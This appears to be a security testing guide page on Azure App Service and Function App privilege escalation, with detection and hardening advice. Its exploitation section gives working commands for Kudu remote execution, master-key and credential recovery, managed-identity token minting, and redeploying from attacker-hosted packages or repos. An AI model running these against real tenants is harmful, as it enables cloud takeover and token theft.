---
cstg_id: CSTG-AZURE-APP-SERVICE-FUNCTIONS-PRIVESC
title: "AZURE App Service Functions - Privilege Escalation"
provider: azure
service: app-service-functions
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - "Microsoft.Web/sites/read"
  - "Microsoft.Web/sites/config/list/action"
  - "Microsoft.Web/sites/publishxml/action"
  - "Microsoft.Web/sites/host/listkeys/action"
  - "Microsoft.Web/sites/functions/listkeys/action"
  - "Microsoft.Web/sites/write"
  - "Microsoft.Web/sites/config/write"
  - "Microsoft.Web/sites/extensions/write"
  - "Microsoft.Web/sites/slots/write"
  - "Microsoft.Web/sites/sourcecontrols/write"
  - "Microsoft.ManagedIdentity/userAssignedIdentities/assign/action"
tools:
  - azure-cli
  - az-rest
  - kudu-api
  - microburst
  - pacu-azure
references:
  - "https://learn.microsoft.com/en-us/azure/app-service/overview-managed-identity"
  - "https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-managed-identities-work-vm-vmss"
  - "https://learn.microsoft.com/en-us/azure/app-service/resources-kudu"
  - "https://learn.microsoft.com/en-us/azure/azure-functions/security-concepts"
  - "https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles"
  - "https://github.com/NetSPI/MicroBurst"
  - "https://hackingthe.cloud/azure/abusing-managed-identities/"
license: CC BY-SA 4.0
---

## Summary

This page maps the App Service / Function App permissions that enable privilege escalation from an assumed-breach foothold (a principal with some `Microsoft.Web` write or key-listing rights, or code execution inside an app). The central escalation primitive is the **managed identity**: an attacker who can run code or commands in the app context, or who can modify the app to do so, can reach the app's local token endpoint (`IDENTITY_ENDPOINT` / IMDS) and mint Entra ID tokens for whatever the identity is authorized to do - frequently far more than the foothold principal can do directly. Secondary primitives include recovering the Functions master key, abusing the Kudu console for RCE, and attaching a more-privileged user-assigned identity to an app the attacker controls.

Each subsection below is keyed to the specific permission that unlocks the path.

## Prerequisites

- An authenticated Azure principal with one or more of the listed `Microsoft.Web/*` actions, OR code/console execution inside an App Service or Function App.
- For identity-token abuse: the target app must have a system-assigned or user-assigned managed identity attached.
- Azure CLI / `az rest` / `curl`, and (for in-app paths) the app's `IDENTITY_ENDPOINT` and `IDENTITY_HEADER` environment values.

## Enumeration

```bash
# What identities are attached, and what can they reach?
az webapp identity show -g <rg> -n <app>
az role assignment list --assignee <identity-principal-id> --all -o table

# Which write/listkeys actions does my own principal hold over the app?
az rest --method post --url \
 "https://management.azure.com/subscriptions/<sub>/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
```

## Misconfigurations & Findings

- An app holds a managed identity with role assignments well beyond the app's needs (Owner/Contributor, Key Vault Secrets User/Officer, Storage Blob Data Contributor, User Access Administrator).
- Low-privileged principals hold `Microsoft.Web/sites/write`, `.../config/write`, `.../extensions/write`, or `publishxml/action` over apps with privileged identities - letting them inject code that assumes the identity.
- The `Microsoft.ManagedIdentity/.../assign/action` is held broadly, allowing attachment of any user-assigned identity to a controllable app.
- The Functions master key is listable by the foothold principal.

## Exploitation

### Microsoft.Web/sites/config/list/action

Listing site config secrets via `listkeys`/`publishxml` is the gateway. With `config/list/action` you can recover **publishing credentials** and **host keys**, both of which lead to code execution:

```bash
# Recover SCM basic-auth credentials, then use Kudu for RCE (see extensions/write)
az rest --method post --url \
 ".../Microsoft.Web/sites/<app>/config/publishingcredentials/list?api-version=2023-12-01"
```

### Microsoft.Web/sites/publishxml/action

Returns the full publish profile (SCM + FTP credentials). These credentials log directly into the Kudu console and FTP, enabling file replacement and command execution without an interactive Entra session:

```bash
az webapp deployment list-publishing-profiles -g <rg> -n <app> --xml
# -> userName / userPWD -> https://<app>.scm.azurewebsites.net (Basic auth) -> RCE
```

### Microsoft.Web/sites/host/listkeys/action (Functions master key)

The master key grants administrative control of the Functions runtime: it invokes any function regardless of `authLevel`, and authenticates to the Functions admin API (`/admin/host/*`, `/admin/functions/*`).

```bash
MK=$(az functionapp keys list -g <rg> -n <app> --query masterKey -o tsv)
# Invoke any function (even admin-level) and call admin endpoints
curl "https://<app>.azurewebsites.net/admin/functions/<fn>" -H "x-functions-key: $MK"
curl -s "https://<app>.azurewebsites.net/admin/host/status" -H "x-functions-key: $MK"
```

### Microsoft.Web/sites/extensions/write (Kudu console -> RCE -> identity token)

The Kudu/SCM command API runs arbitrary commands as the app. From there, query the local managed-identity token endpoint and escalate to whatever the identity can do.

```bash
# Run a command via Kudu (Basic auth from publish profile, or Entra token)
curl -s -u '<user>:<pass>' -X POST \
  https://<app>.scm.azurewebsites.net/api/command \
  -H 'Content-Type: application/json' \
  -d '{"command":"printenv","dir":"site\\wwwroot"}'

# Inside the app, mint an ARM token from the managed identity:
curl -s "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" \
     -H "X-IDENTITY-HEADER: $IDENTITY_HEADER"
# Mint a Key Vault token:
curl -s "$IDENTITY_ENDPOINT?resource=https://vault.azure.net/&api-version=2019-08-01" \
     -H "X-IDENTITY-HEADER: $IDENTITY_HEADER"
# Mint a Microsoft Graph token:
curl -s "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com/&api-version=2019-08-01" \
     -H "X-IDENTITY-HEADER: $IDENTITY_HEADER"
```

Use the resulting bearer token directly against ARM/Graph/Key Vault. If the identity is Contributor/Owner at a higher scope, this is full subscription compromise.

### Microsoft.Web/sites/write and Microsoft.Web/sites/config/write

With write access you do not need a console: redeploy or reconfigure the app to execute attacker code under the identity. Options include setting a startup command, pointing the app at an attacker-controlled container image or package, or adding an app setting that injects code, then triggering the app and harvesting the identity token as above.

```bash
# Point a Linux app at an attacker container image (executes as the identity)
az webapp config container set -g <rg> -n <app> \
  --docker-custom-image-name attacker/img:latest

# Or set Run-From-Package to an attacker-hosted zip
az webapp config appsettings set -g <rg> -n <app> \
  --settings WEBSITE_RUN_FROM_PACKAGE="https://attacker.example/payload.zip"
```

### Microsoft.Web/sites/sourcecontrols/write

Repointing the app's deployment source to an attacker repo causes attacker code to deploy and run with the identity on the next sync.

```bash
az webapp deployment source config -g <rg> -n <app> \
  --repo-url https://github.com/attacker/payload --branch main --manual-integration
```

### Microsoft.ManagedIdentity/userAssignedIdentities/assign/action

If the attacker controls (or can write to) an app but it lacks privileges, attach an existing high-privilege user-assigned identity to that app, then mint its tokens from within.

```bash
az webapp identity assign -g <rg> -n <app> \
  --identities /subscriptions/<sub>/resourcegroups/<rg>/providers/Microsoft.ManagedIdentity/userAssignedIdentities/<priv-uami>
```

### Microsoft.Web/sites/slots/write (slot swap to inherit production)

Deploy attacker code to a staging slot, then swap it into production - inheriting production hostname, identity, and traffic - to execute in the production identity context.

## Detection & Logging

- **Azure Activity Logs** record the enabling control-plane calls: `Microsoft.Web/sites/write`, `.../config/write`, `.../extensions/write`, `.../publishxml/action`, `.../config/list/action`, `.../host/listkeys/action`, `.../sourcecontrols/write`, `.../slots/slotsswap/action`, and `Microsoft.ManagedIdentity/.../assign/action`. A container-image change, Run-From-Package change, or source repointing immediately before traffic is a high-fidelity signal.
- **App Service diagnostic logs** (`AppServiceConsoleLogs`, `AppServiceAuditLogs`, `AppServiceHTTPLogs`, `FunctionAppLogs`) capture Kudu `api/command`, `api/vfs`, SCM logins, and `/admin/*` calls.
- **Entra ID sign-in logs** show the **managed identity** signing in for tokens (service-principal sign-ins) and any subsequent use of those tokens against ARM/Graph/Key Vault - look for an app's identity authenticating to resources it normally never touches.
- **Microsoft Defender for App Service / for Cloud** alerts on suspicious Kudu command execution, anomalous identity token use, and container/source changes.

## Remediation & Hardening

- Apply least privilege to managed identities; never assign Owner/Contributor or broad Key Vault access to an app identity. Scope role assignments to the single resource the app needs.
- Tightly restrict `Microsoft.Web/sites/write`, `config/write`, `extensions/write`, `publishxml/action`, `host/listkeys/action`, `sourcecontrols/write`, `slots/write`, and `ManagedIdentity/.../assign/action`; review Contributor/Website Contributor grants.
- Disable SCM/FTP basic publishing credentials; require Entra ID for the SCM site and apply access restrictions/private endpoints.
- Lock deployment source to trusted, reviewed repos; disable Run-From-Package over arbitrary URLs and pin container images to a trusted registry with admin-credential controls disabled.
- Rotate and minimize use of master/host keys; prefer `function`/`admin` keys scoped per consumer.
- Enable Microsoft Defender for App Service and alert on the Activity Log operations above, especially when followed by managed-identity token use.

## Tools

- **Azure CLI / `az rest`** - identity inspection, config/source/container changes, key and publish-profile recovery.
- **Kudu API** (`/api/command`, `/api/vfs`) - in-app command execution and token-endpoint access.
- **MicroBurst** - automated discovery of app identities, keys, and escalation paths.
- **Pacu (Azure modules)** - assisted managed-identity token abuse workflows.

## References

- [Managed identities for App Service and Functions](https://learn.microsoft.com/en-us/azure/app-service/overview-managed-identity)
- [How managed identities work / token endpoint](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-managed-identities-work-vm-vmss)
- [Kudu / SCM service](https://learn.microsoft.com/en-us/azure/app-service/resources-kudu)
- [Azure Functions security concepts](https://learn.microsoft.com/en-us/azure/azure-functions/security-concepts)
- [Azure RBAC built-in roles](https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles)
- [Abusing managed identities - hackingthe.cloud](https://hackingthe.cloud/azure/abusing-managed-identities/)
- [NetSPI MicroBurst](https://github.com/NetSPI/MicroBurst)
